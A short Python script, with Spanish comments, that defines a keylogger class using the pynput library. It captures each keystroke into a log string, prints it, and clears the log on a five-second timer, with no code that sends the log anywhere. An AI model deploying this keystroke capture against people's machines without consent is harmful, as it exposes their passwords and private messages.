#!/usr/bin/env python3

import threading

import pynput.keyboard


class Keylogger:
    def __init__(self):
        self.log = ""
        self.request_shutdown = False
        self.timer = None

    def pressed_key(self, key):

        try:
            self.log += str(key.char)
        except AttributeError:
            if key == key.space:
                self.log += " "
            else:
                key = str(key).split(".")[1].capitalize()
                self.log += " " + key + " "

        print(self.log)

    def report(self):

        self.log = ""

        # NOTE: Crea un timer con threading y ejecuta cada 5 seg la funcion report
        if not self.request_shutdown:

            self.timer = threading.Timer(5, self.report)
            self.timer.start()

    def shutdown(self):
        self.request_shutdown = True
        self.timer.cancel()

    def start(self):
        # NOTE: Arrancando el listerner
        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key)

        with keyboard_listener:
            self.report()
            keyboard_listener.join()
